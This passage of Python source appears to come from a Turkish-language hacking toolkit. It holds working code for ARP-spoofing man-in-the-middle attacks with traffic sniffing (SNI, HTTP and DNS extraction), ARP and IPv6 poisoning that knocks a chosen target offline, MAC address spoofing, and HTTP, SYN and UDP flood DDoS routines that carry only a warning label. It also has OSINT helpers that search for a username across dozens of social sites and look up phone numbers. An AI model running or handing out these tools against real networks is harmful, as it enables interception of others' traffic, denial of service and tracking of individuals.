                mac = satir.split(":")[-1].strip()
                if "-" in mac: return mac.replace("-", ":")
    return "00:11:22:33:44:55"

def arp_gonder(h_ip, h_mac, k_ip, k_mac, iface):
    try:
        from scapy.all import ARP, Ether, sendp
        sendp(Ether(dst=h_mac) / ARP(op=2, pdst=h_ip, hwdst=h_mac, psrc=k_ip, hwsrc=k_mac), iface=iface, verbose=0)
        return True
    except:
        pass
    if System == "Windows":
        for cmd in [
            ["netsh", "interface", "ip", "set", "neighbors", iface, h_ip, h_mac.replace(":","-")],
            ["arp", "-s", h_ip, h_mac.replace(":","-")],
        ]:
            try:
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                if r.returncode == 0: return True
            except:
                pass
    else:
        try:
            r = subprocess.run(["arp", "-s", h_ip, h_mac.replace(":","-")], capture_output=True, text=True, timeout=5)
            if r.returncode == 0: return True
        except:
            pass
    return False

def ip_forward(aktif=True):
    if System != "Linux": return
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f: f.write("1" if aktif else "0")
    except:
        pass

def ipv6_zehirle(hedef_mac, interface):
    ipv6_list = []
    try:
        if System == "Windows":
            r = subprocess.run(["netsh", "interface", "ipv6", "show", "neighbors"], capture_output=True, text=True, timeout=5)
            for satir in r.stdout.split("\n"):
                if hedef_mac.replace(":", "-")[:8].lower() in satir.lower():
                    for b in satir.split():
                        if b.count(":") >= 5 and "fe80" in b.lower():
                            ipv6_list.append(b.strip()); break
        else:
            r = subprocess.run(["ip", "-6", "neigh", "show"], capture_output=True, text=True, timeout=5)
            for satir in r.stdout.split("\n"):
                if hedef_mac.lower() in satir.lower():
                    b = satir.split()
                    if b and "fe80" in b[0].lower(): ipv6_list.append(b[0])
    except:
        pass
    if not ipv6_list: return []
    for ipv6 in ipv6_list:
        try:
            if System == "Windows":
                subprocess.run(["netsh", "interface", "ipv6", "set", "neighbors", interface, ipv6, "00-00-00-00-00-00"], capture_output=True, timeout=5)
            else:
                subprocess.run(["ip", "-6", "neigh", "replace", ipv6, "dev", interface, "lladdr", "00:00:00:00:00:00", "nud", "stale"], capture_output=True, timeout=5)
        except:
            pass
    return ipv6_list

def ipv6_temizle(ipv6_list, interface):
    for ipv6 in ipv6_list:
        try:
            if System == "Windows":
                subprocess.run(["netsh", "interface", "ipv6", "delete", "neighbors", interface, ipv6], capture_output=True, timeout=5)
            else:
                subprocess.run(["ip", "-6", "neigh", "del", ipv6, "dev", interface], capture_output=True, timeout=5)
        except:
            pass

def arayuz_ip(interface):
    if System == "Windows":
        for deneme in [
            ["route", "print", "0.0.0.0"],
            ["netsh", "interface", "ip", "show", "config"],
            ["ipconfig"],
            ["powershell", "-c", "(Get-NetIPAddress -AddressFamily IPv4 | Where InterfaceIndex -eq (Get-NetRoute -DestinationPrefix '0.0.0.0/0').InterfaceIndex).IPAddress"],
        ]:
            try:
                r = subprocess.run(deneme, capture_output=True, text=True, timeout=5)
                if "route" in deneme[0]:
                    for satir in r.stdout.split("\n"):
                        if "0.0.0.0" in satir and satir.strip().startswith("0.0.0.0"):
                            b = satir.split()
                            if len(b) >= 4 and b[3].count(".") == 3:
                                return b[3]
                elif "netsh" in deneme[0]:
                    import re
                    for p in [r"IP Address:\s+(\d+\.\d+\.\d+\.\d+)", r"IP Adresi:\s+(\d+\.\d+\.\d+\.\d+)"]:
                        m = re.search(p, r.stdout)
                        if m: return m.group(1)
                elif "ipconfig" in deneme[0]:
                    for satir in r.stdout.split("\n"):
                        if "IPv4" in satir and ":" in satir:
                            ip = satir.split(":")[-1].strip()
                            if ip.count(".") == 3:
                                return ip
                else:
                    ip = r.stdout.strip()
                    if ip.count(".") == 3:
                        return ip
            except:
                pass
    else:
        try:
            r = subprocess.run(["ip", "addr", "show", interface], capture_output=True, text=True, timeout=5)
            for satir in r.stdout.split("\n"):
                if "inet " in satir:
                    return satir.strip().split()[1].split("/")[0]
        except:
            pass
    return None

def npcap_kontrol():
    return os.path.exists(r"C:\Windows\System32\drivers\npcap.sys") if System == "Windows" else True

_dns_cache = {}
def ip_coz(ip):
    if ip in _dns_cache: return _dns_cache[ip]
    try:
        h = socket.gethostbyaddr(ip)[0]
        _dns_cache[ip] = h
        return h
    except:
        _dns_cache[ip] = ip
        return ip

def sni_bul(yuk):
    try:
        if yuk[0] != 0x16: return None
        el = 5
        if el >= len(yuk) or yuk[el] != 0x01: return None
        el += 4
        el += 32
        el += 1 + yuk[el]
        el += 2
        el += 2 + (yuk[el] << 8 | yuk[el+1]) if el+2 <= len(yuk) else 0
        el += 1
        if el >= len(yuk): return None
        while el + 4 < len(yuk):
            ext_type = (yuk[el] << 8) | yuk[el+1]
            ext_len = (yuk[el+2] << 8) | yuk[el+3]
            el += 4
            if el + ext_len > len(yuk): break
            if ext_type == 0x0000:
                sni = el + 2
                if sni + 3 >= len(yuk): break
                sni += 1
                isim_uz = (yuk[sni] << 8) | yuk[sni+1]
                sni += 2
                if sni + isim_uz <= len(yuk):
                    return yuk[sni:sni+isim_uz].decode("utf-8", errors="ignore")
                break
            el += ext_len
    except:
        pass
    return None

def trafik_izle(hedef_ip, interface, duration=999999):
    ok(f"Hedef ({hedef_ip}) trafigi izleniyor... ({interface})")
    warn("CTRL+C ile durdurun\n")

    def hedef_baglantilar(ip):
        try:
            r = subprocess.run(["netstat", "-n"], capture_output=True, text=True, timeout=5)
            bag = []
            for satir in r.stdout.split("\n"):
                if any(s in satir for s in ["ESTABLISHED", "TIME_WAIT", "CLOSE_WAIT", "SYN_SENT"]):
                    if ip in satir:
                        b = satir.split()
                        if len(b) >= 4:
                            bag.append(f"{b[1]} -> {b[2]} ({b[3]})")
            return bag
        except:
            return []

    def netstat_loop():
        ok("Npcap bulunamadi, netstat ile baglanti takibi yapiliyor.")
        info("Hedefin aktif baglantilari 10sn'de bir listelenecek.\n")
        while True:
            time.sleep(10)
            bag = hedef_baglantilar(hedef_ip)
            if bag:
                ok(f"{hedef_ip} baglantilari:")
                tablo(("Yerel:Port", "Uzak:Port", "Durum"),
                      [(b.split(" -> ")[0], b.split(" -> ")[1].split(" (")[0], b.split("(")[-1].rstrip(")")) for b in bag[:10]])
                if len(bag) > 10:
                    info(f"+{len(bag)-10} baglanti daha")
            else:
                info("Aktif baglanti yok.")

    def scapy_sniff():
        from scapy.all import sniff
        def analiz(p):
            if not p.haslayer("IP"): return
            ip = p["IP"]
            if ip.src != hedef_ip and ip.dst != hedef_ip: return
            if p.haslayer("TCP"):
                tcp = p["TCP"]
                syn = " [SYN]" if tcp.flags & 0x02 else ""
                sni = None
                if tcp.dport == 443 and p.haslayer("Raw") and tcp.flags & 0x02 == 0:
                    try: sni = sni_bul(bytes(p["Raw"].load))
                    except: pass
                if ip.src == hedef_ip:
                    dom = sni or ip_coz(ip.dst)
                    yon = f"{G}{ip.src}{S}->{C}{ip.dst}{S}:{tcp.dport}" + (f" ({dom})" if dom != ip.dst else "")
                else:
                    dom = ip_coz(ip.src)
                    yon = f"{C}{ip.src}{S}:{tcp.sport}->{G}{ip.dst}{S}" + (f" ({dom})" if dom != ip.src else "")
                print(f"  {W}[TCP]{S} {yon}{syn}")
                if p.haslayer("Raw") and tcp.dport == 80:
                    try:
                        yuk = p["Raw"].load.decode("utf-8", errors="ignore")
                        for satir in yuk.split("\n"):
                            s2 = satir.strip()
                            if s2.startswith("GET ") or s2.startswith("POST ") or s2.startswith("Host:") or s2.startswith("CONNECT "):
                                print(f"    {G}HTTP>{S} {s2[:100]}")
                                break
                    except:
                        pass
            if p.haslayer("UDP") and p["UDP"].dport == 53 and p.haslayer("DNSQR"):
                print(f"  {W}[DNS]{S} {G}{ip.src}{S} -> {C}{p['DNSQR'].qname.decode()}{S}")
            if p.haslayer("ARP"):
                pass
        sniff(iface=interface, prn=analiz, store=0)

    if System == "Windows" and not npcap_kontrol():
        netstat_loop()
        return

    try:
        if System == "Windows":
            from scapy.all import conf
            conf.use_pcap = True
        scapy_sniff()
    except ImportError:
        fail("scapy gerekli! pip install scapy")
        if System == "Windows":
            netstat_loop()
    except PermissionError:
        fail("Yonetici/Root yetkisi gerekli!")
    except Exception as e:
        fail(f"Sniff hatasi: {e}")
        if System == "Windows":
            netstat_loop()

def arp_spoof(hedef_ip, gateway_ip, interface):
    hedef_mac = getmac(hedef_ip, interface)
    gateway_mac = getmac(gateway_ip, interface)
    if not hedef_mac or not gateway_mac:
        fail("MAC bulunamadi!"); return
    benim_mac = kendi_mac_al(interface)
    ok(f"MITM basladi: {hedef_ip} <-> {gateway_ip}")
    ok(f"Trafik sizin uzerinizden gececek ({benim_mac})")
    ip_forward(True)
    warn("CTRL+C ile durdurun\n")
    spoof_aktif = True

    def spoof_loop():
        while spoof_aktif:
            arp_gonder(hedef_ip, hedef_mac, gateway_ip, benim_mac, interface)
            arp_gonder(gateway_ip, gateway_mac, hedef_ip, benim_mac, interface)
            time.sleep(1)

    t = threading.Thread(target=spoof_loop, daemon=True)
    t.start()
    try:
        trafik_izle(hedef_ip, interface, duration=999999)
    except KeyboardInterrupt:
        pass
    spoof_aktif = False
    ok("ARP tablolari geri yukleniyor...")
    arp_gonder(hedef_ip, hedef_mac, gateway_ip, gateway_mac, interface)
    arp_gonder(gateway_ip, gateway_mac, hedef_ip, hedef_mac, interface)
    if System == "Windows":
        subprocess.run(["arp", "-d", hedef_ip], capture_output=True)
        subprocess.run(["arp", "-d", gateway_ip], capture_output=True)
    ok("Temizlendi.")

def baglanti_kes(hedef_ip, gateway_ip, interface):
    if System == "Windows" and not npcap_kontrol():
        ok("Npcap yok, firewall ile engelleniyor...")
        internet_engelle(hedef_ip)
        return
    hedef_mac = getmac(hedef_ip, interface)
    if not hedef_mac:
        fail("MAC bulunamadi!"); return
    benim_mac = kendi_mac_al(interface)
    gateway_mac = getmac(gateway_ip, interface)
    info(f"Hedef: {hedef_mac} | Gateway: {gateway_mac or '?'} | Ben: {benim_mac}")
    ip_forward(False)
    ipv6_list = ipv6_zehirle(hedef_mac, interface)
    warn("ARP zehirleme basladi - Hedefin interneti kesilecek.")
    warn("CTRL+C ile durdurun.\n")
    sayac = 0
    kes_aktif = True

    def zehirle():
        nonlocal sayac
        while kes_aktif:
            arp_gonder(hedef_ip, hedef_mac, gateway_ip, benim_mac, interface)
            if gateway_mac:
                arp_gonder(gateway_ip, gateway_mac, hedef_ip, benim_mac, interface)
            sayac += 1; time.sleep(0.5)

    t = threading.Thread(target=zehirle, daemon=True)
    t.start()

    try:
        while kes_aktif:
            time.sleep(10)
            warn(f"HEDEF KOPUYOR ({sayac} ARP paketi)")
    except KeyboardInterrupt:
        kes_aktif = False
        ok("Durduruldu.")
    ok("ARP tablolari geri yukleniyor...")
    if gateway_mac:
        arp_gonder(hedef_ip, hedef_mac, gateway_ip, gateway_mac, interface)
        arp_gonder(gateway_ip, gateway_mac, hedef_ip, hedef_mac, interface)
    if System == "Windows":
        subprocess.run(["arp", "-d", hedef_ip], capture_output=True)
        subprocess.run(["arp", "-d", gateway_ip], capture_output=True)
    ipv6_temizle(ipv6_list, interface)
    ok("Hedef normal baglantiya dondu.")

def paket_yakala(interface, adet=50):
    try:
        from scapy.all import sniff
    except ImportError:
        fail("scapy kurulu degil! pip install scapy"); return
    ok(f"Dinleniyor ({interface}, {adet} paket)... CTRL+C durdurur\n")
    s = {"http": 0, "dns": 0, "arp": 0, "toplam": 0}

    def analiz(p):
        s["toplam"] += 1
        if p.haslayer("IP"):
            ip = p["IP"]
            if p.haslayer("TCP") and p.haslayer("Raw"):
                try:
                    y = p["Raw"].load.decode("utf-8", errors="ignore")
                    if "HTTP/" in y or "GET " in y or "POST " in y:
                        s["http"] += 1; print(f"{G}  HTTP{S} {ip.src} -> {ip.dst}: {y.split(chr(10))[0][:60]}")
                except:
                    pass
            if p.haslayer("UDP") and p["UDP"].dport == 53 and p.haslayer("DNSQR"):
                s["dns"] += 1; print(f"{C}  DNS{S} {ip.src} -> {p['DNSQR'].qname.decode()}")
        if p.haslayer("ARP"):
            s["arp"] += 1; a = p["ARP"]; print(f"{Y}  ARP{S} {a.psrc} -> {a.pdst}")

    try:
        sniff(iface=interface, prn=analiz, count=adet, store=0, timeout=30)
    except PermissionError:
        fail("Root gerekli!")
    except Exception as e:
        fail(f"Hata: {e}")
    print(f"\n{C}  OZET{S} HTTP:{s['http']} DNS:{s['dns']} ARP:{s['arp']} Toplam:{s['toplam']}")

def bagli_cihazlar():
    rows = []
    if System == "Linux":
        try:
            with open("/proc/net/arp") as f:
                satirlar = [s for s in f.read().strip().split("\n")[1:] if s.strip()]
        except:
            fail("ARP okunamiyor!"); return
        for s in satirlar:
            b = s.split()
            if len(b) >= 4:
                ip = b[0]; mac = b[3]; isim = ip_coz(ip) if ip.count(".") == 3 and mac not in ("00:00:00:00:00:00", "") else ""
                if mac.count(":") == 5:
                    rows.append((ip, mac, isim if isim != ip else ""))
    else:
        r = subprocess.run(["arp", "-a"], capture_output=True, text=True)
        for satir in r.stdout.split("\n"):
            b = satir.split()
            if len(b) >= 3 and b[0].count(".") == 3:
                ip = b[0]; mac = b[1].replace("-", ":")
                if mac.count(":") == 5:
                    isim = ip_coz(ip) if ip.count(".") == 3 else ""
                    rows.append((ip, mac, isim if isim != ip else ""))
    if rows:
        tablo(("IP", "MAC", "Cihaz"), rows)
    else:
        info("Bagli cihaz bulunamadi.")

def internet_engelle(ip):
    if System == "Windows":
        try:
            subprocess.run(["netsh", "advfirewall", "firewall", "add", "rule",
                f"name=AHT_BLOCK_{ip.replace('.','_')}", "dir=out", f"remoteip={ip}", "action=block"],
                capture_output=True, timeout=5, check=True)
            subprocess.run(["netsh", "advfirewall", "firewall", "add", "rule",
                f"name=AHT_BLOCK_{ip.replace('.','_')}_IN", "dir=in", f"remoteip={ip}", "action=block"],
                capture_output=True, timeout=5, check=True)
            ok(f"{ip} engellendi. CTRL+C ile kaldir.")
            warn("CTRL+C ile kaldirin.\n")
            try:
                while True: time.sleep(1)
            except KeyboardInterrupt:
                internet_engel_kaldir(ip)
                ok("Engel kaldirildi.")
        except:
            fail("Firewall kurali eklenemedi!")
        return
    if not Root: fail("Root gerekli!"); return
    os.system(f"sudo iptables -A FORWARD -s {ip} -j DROP")
    os.system(f"sudo iptables -A FORWARD -d {ip} -j DROP")
    ok(f"{ip} engellendi. CTRL+C ile kaldir.")
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        os.system(f"sudo iptables -D FORWARD -s {ip} -j DROP 2>/dev/null")
        os.system(f"sudo iptables -D FORWARD -d {ip} -j DROP 2>/dev/null")
        ok("Engel kaldirildi.")

def internet_engel_kaldir(ip):
    if System == "Windows":
        try:
            subprocess.run(["netsh", "advfirewall", "firewall", "delete", "rule",
                f"name=AHT_BLOCK_{ip.replace('.','_')}"], capture_output=True, timeout=5, check=True)
            subprocess.run(["netsh", "advfirewall", "firewall", "delete", "rule",
                f"name=AHT_BLOCK_{ip.replace('.','_')}_IN"], capture_output=True, timeout=5, check=True)
        except:
            pass

def bettercap_menu():
    while True:
        clear_screen(); baslik(_("network_tools")); durum_cubugu()
        if not Root and System == "Linux":
            fail("Bazi islemler root gerektirir.")
        secim = secim_menu([
            ("1",_("ag_taramasi")), ("2",_("arp_spoof")),
            ("3",_("sniffing")), ("4",_("bagli_cihazlar")), ("5",_("baglanti_kes")),
            ("6",_("engelle")), ("0",_("ana_menu")),
        ])
        if secim.upper() == "L":
            LANG = "EN" if LANG == "TR" else "TR"; continue
        if secim == "0": return "Home"
        interface = sor_arayuz()
        if not interface: continue

        if secim == "1":
            clear_screen(); baslik(f"{_('network_tools')} | {_('ag_taramasi')}"); durum_cubugu()
            ip_araligi = soru(_("ip_araligi"), "192.168.1.0/24")
            if not ip_araligi: continue
            if "/" not in ip_araligi: ip_araligi = ".".join(ip_araligi.split(".")[:3]) + ".0/24"
            cihazlar = ag_tara(interface, ip_araligi)
            if cihazlar:
                ok(f"{len(cihazlar)} {_('cihaz_bulundu')}:")
                tablo(("IP", "MAC", "Cihaz"), [(c["ip"], c["mac"], c.get("isim","") or "") for c in cihazlar])
            else:
                fail(_("cihaz_yok"))

        elif secim == "2":
            clear_screen(); baslik(f"{_('network_tools')} | {_('arp_spoof')}"); durum_cubugu()
            hedef_ip = soru(_("hedef_ip"), "0=iptal")
            if not hedef_ip: continue
            gateway_ip = soru(_("gateway_ip"), gateway_bul())
            if not gateway_ip: continue
            arp_spoof(hedef_ip, gateway_ip, interface)

        elif secim == "3":
            clear_screen(); baslik(f"{_('network_tools')} | {_('sniffing')}"); durum_cubugu()
            adet = soru(_("paket_sayisi"), "50")
            try: adet = int(adet)
            except: adet = 50
            paket_yakala(interface, adet)

        elif secim == "4":
            clear_screen(); baslik(f"{_('network_tools')} | {_('bagli_cihazlar')}"); durum_cubugu()
            bagli_cihazlar()

        elif secim == "5":
            clear_screen(); baslik(f"{_('network_tools')} | {_('baglanti_kes')}"); durum_cubugu()
            hedef_ip = soru(f"{_('hedef_ip')} (0={_('iptal')})")
            if not hedef_ip: continue
            gateway_ip = soru(_("gateway_ip"), gateway_bul())
            if not gateway_ip: continue
            baglanti_kes(hedef_ip, gateway_ip, interface)

        elif secim == "6":
            clear_screen(); baslik(f"{_('network_tools')} | {_('engelle')}"); durum_cubugu()
            alt = secim_menu([("1","Engelle"), ("2","Kaldir"), ("0",_("onceki"))])
            if alt == "0": continue
            hedef_ip = soru(f"{_('hedef_ip')} (0={_('iptal')})")
            if not hedef_ip: continue
            internet_engelle(hedef_ip) if alt == "1" else internet_engel_kaldir(hedef_ip)

        else:
            fail(_("gecersiz")); bekle(); continue
        input(f"  {Y}{_('enter')}{S} ")

def ip_geolocation():
    clear_screen(); baslik(_("ip_geo"))
    ip = soru(f"{_('ip_adresi')} (0={_('iptal')})")
    if not ip: return "Home"
    info(_("sorgulaniyor").format(ip=ip))
    try:
        req = urllib.request.Request(f"http://ip-api.com/json/{ip}", headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=10) as r:
            d = json.loads(r.read().decode())
        if d["status"] == "success":
            for k, v in [(_("ulke"), f"{d['country']} ({d['countryCode']})"), (_("sehir"), d["city"]),
                         (_("bolge"), d["regionName"]), (_("isp"), d["isp"]), (_("enlem_boylam"), f"{d['lat']}/{d['lon']}"),
                         (_("zaman"), d["timezone"])]:
                ok(f"{k}: {v}")
        else:
            fail(d.get("message", _("hata")))
    except Exception as e:
        fail(_("baglanti_hatasi").format(e=e))
    input(f"  {Y}{_('enter')}{S} "); return "Home"

def port_scanner():
    clear_screen(); baslik(_("port_scanner"))
    hedef = soru(f"{_('ip_domain')} (0={_('iptal')})")
    if not hedef: return "Home"
    info(_("taranıyor").format(hedef=hedef))
    open_ports = []
    def scan(p):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(0.5)
            if s.connect_ex((hedef, p)) == 0: open_ports.append(p)
            s.close()
        except: pass
    threads = [threading.Thread(target=scan, args=(p,), daemon=True) for p in range(1, 1025)]
    for t in threads: t.start()
    for t in threads: t.join()
    if open_ports:
        ok(f"{len(open_ports)} {_('acik_port')}")
        rows = []
        for p in sorted(open_ports):
            try: svc = socket.getservbyport(p)
            except: svc = "?"
            rows.append((str(p), svc))
        tablo(("Port", _("servis")), rows)
    else:
        fail(_("acik_port_yok"))
    input(f"  {Y}{_('enter')}{S} "); return "Home"

def mac_changer():
    clear_screen(); baslik(_("mac_changer"))
    if System == "Windows": fail(_("linux_gerekli")); input(f"  {Y}{_('enter')}{S} "); return "Home"
    if not Root: fail(_("root_gerekli")); input(f"  {Y}{_('enter')}{S} "); return "Home"
    interface = sor_arayuz()
    if not interface: return "Home"
    secim = secim_menu([("1",_("rastgele_mac")), ("2",_("ozel_mac")), ("0",_("onceki"))])
    if secim == "0": return "Home"
    sudo = "" if System == "Windows" else "sudo "
    if secim == "1":
        mac = ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
        os.system(f"{sudo}ifconfig {interface} down; {sudo}ifconfig {interface} hw ether {mac}; {sudo}ifconfig {interface} up")
        ok(_("yeni_mac").format(mac=mac))
    elif secim == "2":
        mac = soru(f"{_('mac_adresi')} (0={_('iptal')})")
        if not mac: return "Home"
        os.system(f"{sudo}ifconfig {interface} down; {sudo}ifconfig {interface} hw ether {mac}; {sudo}ifconfig {interface} up")
        ok(_("yeni_mac").format(mac=mac))
    input(f"  {Y}{_('enter')}{S} "); return "Home"

def ddos_tool():
    clear_screen(); baslik(_("ddos"))
    warn(_("egitim_uyari"))
    hedef_ip = soru(f"{_('hedef_ip_domain')} (0={_('iptal')})")
    if not hedef_ip: return "Home"
    port = soru(_("hedef_port"), "80")
    if not port: return "Home"
    try: port = int(port)
    except: fail(_("gecersiz_port")); bekle(); return "Home"
    secim = secim_menu([("1","HTTP Flood"), ("2","SYN Flood"), ("3","UDP Flood"), ("0",_("onceki"))])
    if secim == "0": return "Home"
    thread_s = soru(_("thread_sayisi"), "100")
    try: thread_s = int(thread_s)
    except: thread_s = 100
    aktif = True

    def http_f():
        while aktif:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(3)
                s.connect((hedef_ip, port)); s.send(f"GET / HTTP/1.1\r\nHost: {hedef_ip}\r\n\r\n".encode()); s.close()
            except: pass

    def syn_f():
        while aktif:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(1)
                s.connect_ex((hedef_ip, port))
            except: pass

    def udp_f():
        while aktif:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(random._urandom(512), (hedef_ip, port)); s.close()
            except: pass

    funcs = {"1": http_f, "2": syn_f, "3": udp_f}
    if secim not in funcs: fail(_("gecersiz")); bekle(); return "Home"
    ok(_("thread_rapor").format(ip=hedef_ip, port=port, t=thread_s)); warn(f"{_('durdurur')}\n")
    threads = [threading.Thread(target=funcs[secim], daemon=True) for _ in range(thread_s)]
    for t in threads: t.start()
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        aktif = False; ok(_("durduruldu"))
    bekle(); return "Home"

OSINT_HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
# Ek doğrulama fonksiyonları (bazı siteler her şeye 200 döndürür)
PLATFORM_CHECKS = {
    "TikTok": lambda u: requests.get(f"https://www.tiktok.com/oembed?url=https://www.tiktok.com/@{u.lower()}", headers=OSINT_HEADERS, timeout=5).status_code == 200,
}
SOCIAL_PLATFORMS = [
    ("Instagram",     "https://www.instagram.com/{u}/"),
    ("Facebook",      "https://www.facebook.com/{u}"),
    ("Twitter/X",     "https://twitter.com/{u}"),
    ("TikTok",        "https://www.tiktok.com/@{u}"),
    ("YouTube",       "https://www.youtube.com/@{u}"),
    ("Snapchat",      "https://www.snapchat.com/add/{u}"),
    ("Reddit",        "https://www.reddit.com/user/{u}"),
    ("LinkedIn",      "https://www.linkedin.com/in/{u}/"),
    ("Pinterest",     "https://www.pinterest.com/{u}/"),
    ("GitHub",        "https://github.com/{u}"),
    ("Twitch",        "https://www.twitch.tv/{u}"),
    ("Telegram",      "https://t.me/{u}"),
    ("Tumblr",        "https://{u}.tumblr.com/"),
    ("Medium",        "https://medium.com/@{u}"),
    ("Steam",         "https://steamcommunity.com/id/{u}"),
    ("Spotify",       "https://open.spotify.com/user/{u}"),
    ("Dev.to",        "https://dev.to/{u}"),
    ("Behance",       "https://www.behance.net/{u}"),
    ("Dribbble",      "https://dribbble.com/{u}"),
    ("Flickr",        "https://www.flickr.com/people/{u}/"),
    ("VK",            "https://vk.com/{u}"),
    ("Threads",       "https://www.threads.net/@{u}"),
    ("Vimeo",         "https://vimeo.com/{u}"),
    ("SoundCloud",    "https://soundcloud.com/{u}"),
    ("Bandcamp",      "https://bandcamp.com/{u}"),
    ("About.me",      "https://about.me/{u}"),
    ("Keybase",       "https://keybase.io/{u}"),
    ("Imgur",         "https://imgur.com/user/{u}"),
    ("DailyMotion",   "https://www.dailymotion.com/{u}"),
    ("ProductHunt",   "https://www.producthunt.com/@{u}"),
    ("Fiverr",        "https://www.fiverr.com/{u}"),
    ("HackerNews",    "https://news.ycombinator.com/user?id={u}"),
    ("Gravatar",      "https://gravatar.com/{u}"),
]

def sherlock_ara():
    baslik(_("sherlock"))
    kadi = input(f"  {_('kullanici_adi')}: ").strip()
    if not kadi: return

    kullanici_varyasyonlari = [kadi]
    if " " in kadi:
        parcalar = kadi.split()
        kullanici_varyasyonlari = [
            "".join(parcalar),
            "_".join(parcalar),
            ".".join(parcalar),
        ]

    bulunan = []
    ilk_hata = None
    toplam = len(SOCIAL_PLATFORMS)
    for i, (site, url_sablon) in enumerate(SOCIAL_PLATFORMS, 1):
        for varyant in kullanici_varyasyonlari:
            sys.stdout.write(f"\r  {W}{_('sherlock')} - {site} ({varyant})... ({i}/{toplam}){S}\033[K")
            sys.stdout.flush()
            try:
                tam_url = url_sablon.format(u=varyant)
                if site in PLATFORM_CHECKS:
                    bulundu_mu = PLATFORM_CHECKS[site](varyant)
                else:
                    r = requests.get(tam_url, headers=OSINT_HEADERS, timeout=5, allow_redirects=False)
                    bulundu_mu = r.status_code == 200
                if bulundu_mu:
                    bulunan.append((site, tam_url, varyant))
                    sys.stdout.write(f"\r\033[K")
                    ok(f"{site}: {tam_url}")
            except Exception as e:
                if not ilk_hata:
                    ilk_hata = f"{type(e).__name__}: {str(e)[:60]}"
            time.sleep(0.1)

    sys.stdout.write(f"\r\033[K")
    if bulunan:
        ok(f"{len(bulunan)} {_('profil_bulundu')}")
        r = input(f"  {W}{_('kaydet')}{S} {Y}({'E' if LANG=='TR' else 'Y'}/h):{S} ").strip().lower()
        if r in ("", "e", "evet", "y", "yes"):
            ts = time.strftime("%Y%m%d_%H%M%S")
            dosya = f"sherlock_{kadi.replace(' ','_')}_{ts}.txt"
            with open(dosya, "w", encoding="utf-8") as f:
                for site, url, v in bulunan:
                    f.write(f"{site}: {url}\n")
            ok(f"{_('kaydedildi')}: {dosya}")
    else:
        fail(f"{_('profil_yok')}")
        if ilk_hata:
            info(f"Hata: {ilk_hata}")
    input(f"  {Y}{_('enter')}{S} ")

def web_ara():
    baslik(_("web_ara"))
    sorgu = input(f"  {_('sorgu')}: ").strip()
    if not sorgu: return
    try:
        warn(f"  {_('web_ara')} taranıyor...")
        from ddgs import DDGS
        ddgs = DDGS()
        ddgs._timeout = 20
        sonuclar = []
        for i, r in enumerate(ddgs.text(sorgu, max_results=15)):
            sonuclar.append((r['title'], r['href']))
            info(f"{i+1}. {r['title']}")
            print(f"     {r['href']}")
        if sonuclar:
            ok(f"\n{len(sonuclar)} {_('sonuc')}")
        else:
            fail(f"\n{_('profil_yok')}")
    except:
        fail(f"  {_('hata')}")
    input(f"  {Y}{_('enter')}{S} ")

OPERATOR_MAP = {
    "501": "Türk Telekom", "502": "Türk Telekom", "503": "Türk Telekom",
    "504": "Türk Telekom", "505": "Vodafone", "506": "Vodafone",
    "507": "Turkcell", "530": "Turkcell", "531": "Turkcell",
    "532": "Turkcell", "533": "Vodafone", "534": "Vodafone",
    "535": "Vodafone", "536": "Vodafone", "537": "Vodafone",
    "538": "Vodafone", "539": "Vodafone", "540": "Vodafone",
    "541": "Turkcell", "542": "Vodafone", "543": "Vodafone",
    "544": "Vodafone", "545": "Turkcell", "546": "Turkcell",
    "547": "Turkcell", "548": "Turkcell", "549": "Turkcell",
    "550": "Türk Telekom", "551": "Türk Telekom", "552": "Türk Telekom",
    "553": "Türk Telekom", "554": "Türk Telekom", "555": "Türk Telekom",
    "556": "Türk Telekom", "557": "Türk Telekom", "558": "Türk Telekom",
    "559": "Türk Telekom",
}

def telefon_osint():
    baslik(_("telefon_osint"))
    no = soru(f"  {_('telefon_no_gir')}")
    if not no: return
    no = no.strip().lstrip("0")
    if not no.isdigit() or len(no) < 10:
        fail(_("gecersiz_sayi")); bekle(); return
    info(_("numara_analiz")); print()
    ok(f"  {_('telefon_no')}: +90{no}")
    ok(f"  {_('ulke_kodu')}: +90 (Türkiye)")
    ok(f"  {_('operator')}: {OPERATOR_MAP.get(no[:3], 'Bilinmiyor')}")
    ok(f"  Ulusal: 0{no}")
    ok(f"  Uluslararası: +90{no}")
    ts = time.strftime("%Y%m%d_%H%M%S")
    dosya = f"osint-{no}-{ts}.txt"
    with open(dosya, "w", encoding="utf-8") as f:
        f.write(f"Telefon: +90{no}\nUlke: +90 (Turkiye)\nOperator: {OPERATOR_MAP.get(no[:3], 'Bilinmiyor')}\n")
        f.write(f"Ulusal: 0{no}\nUluslararasi: +90{no}\nTarih: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
    ok(_("kaydedildi").format(dosya=dosya))
    input(f"\n  {Y}{_('enter')}{S} ")

def google_dorking():
    baslik(_("google_dorking"))
    dork = input(f"  {_('dork_sorgu')}: ").strip()
    if not dork: return
    try: limit = int(input(f"  {_('kac_sonuc')} (1-50): ").strip() or "15")
    except: limit = 15
    if limit < 1: limit = 15
    warn(f"  Google'da {_('web_ara')} taranıyor...")
    try:
        h = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"}
        r = requests.get(f"https://www.google.com/search?q={urllib.parse.quote(dork)}&num={limit}", headers=h, timeout=15)
        if r.status_code != 200:
            fail(f"Google yanit vermedi (HTTP {r.status_code})"); input(f"  {Y}{_('enter')}{S} "); return
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(r.text, "html.parser")
        sonuclar = []
        for g in soup.select("div.g"):
            a = g.select_one("a[href]")
            h3 = g.select_one("h3")
            if a and h3:
                href = a["href"]
